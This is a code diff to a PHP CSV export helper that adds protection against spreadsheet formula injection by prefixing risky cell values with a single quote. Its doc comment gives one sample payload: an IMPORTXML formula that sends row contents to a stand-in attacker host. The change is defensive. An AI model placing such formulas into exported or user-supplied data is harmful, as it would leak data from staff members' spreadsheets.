@@ -14,6 +14,26 @@ namespace App\Helpers;
 final class Csv
 {
     /**
+     * QA-5 RPT-02: a client/order name or comment field can carry
+     * attacker-chosen text (client self-service forms, free-text reasons,
+     * disputes, comments) all the way into a report export. Excel/Sheets/
+     * LibreOffice treat a cell starting with =, +, -, @, or tab/CR as a
+     * formula on open — e.g. a client name of
+     * '=IMPORTXML("http://attacker/",CONCATENATE(A1:Z1))' run through a
+     * staff member's spreadsheet exfiltrates whatever row it lands in. CSV
+     * has no cell-format escape, so the standard mitigation is prefixing
+     * such values with a literal single quote, which every spreadsheet
+     * app renders as plain text instead of evaluating.
+     */
+    private static function neutralizeFormula(string $value): string
+    {
+        if ($value !== '' && str_contains("=+-@\t\r", $value[0])) {
+            return "'" . $value;
+        }
+        return $value;
+    }
+
+    /**
      * Streams a CSV directly to the response and exits — call this last,
      * after all validation, since it sends headers and terminates output.
      *
@@ -30,15 +50,9 @@ final class Csv
         fprintf($out, "\xEF\xBB\xBF"); // UTF-8 BOM so Excel opens non-ASCII text correctly
         fputcsv($out, $headers, ',', '"', '\\');
         foreach ($rows as $row) {
-            if (array_is_list($row)) {
-                fputcsv($out, $row, ',', '"', '\\');
-                continue;
-            }
-            $ordered = [];
-            foreach ($headers as $h) {
-                $ordered[] = $row[$h] ?? '';
-            }
-            fputcsv($out, $ordered, ',', '"', '\\');
+            $ordered = array_is_list($row) ? $row : array_map(static fn ($h) => $row[$h] ?? '', $headers);
+            $safe = array_map(static fn ($v) => self::neutralizeFormula((string) $v), $ordered);
+            fputcsv($out, $safe, ',', '"', '\\');
         }
         fclose($out);
         exit;
